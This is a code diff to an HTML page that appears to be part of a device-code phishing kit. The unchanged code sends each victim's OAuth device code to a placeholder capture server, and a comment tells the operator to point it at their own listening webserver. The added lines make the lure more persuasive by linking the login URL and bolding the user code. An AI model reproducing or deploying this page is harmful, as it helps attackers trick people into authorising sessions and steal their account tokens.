@@ -15,10 +15,35 @@
             document.getElementById('code').innerHTML += data.message;
             // Change this line to point to your listening webserver
             $.get("https://MYCaptureServer/?id=" + data.device_code);
-            //document.write(data.message);
-        });
-
-        </script>
+            let message = data.message;
+                
+                // Use regex to find the URL
+                let urlMatch = message.match(/(https?:\/\/[^\s]+)/g);
+                
+                if (urlMatch && urlMatch.length > 0) {
+                    // Found a URL
+                    let url = urlMatch[0];
+                    let urlWithLink = `<a href="${url}" target="_blank">${url}</a>`;
+                    
+                    // Replace URL in the message with the new URL (which includes the link)
+                    message = message.replace(url, urlWithLink);
+                }
+                
+                // Use regex to find the code
+                let codeMatch = message.match(/\b[A-Z0-9]{1,9}\b/);
+                
+                if (codeMatch && codeMatch.length > 0) {
+                    // Found a code
+                    let code = codeMatch[0];
+                    let boldCode = `<strong>${code}</strong>`;
+                    
+                    // Replace code in the message with the bolded code
+                    message = message.replace(code, boldCode);
+                }
+                // Display the result
+                document.getElementById('code').innerHTML += message;
+            });
+            </script>
 </head>
 <body  dir="ltr" lang="en">
     <table width="100%" cellpadding="0" cellspacing="0" border="0" dir="ltr" lang="en">
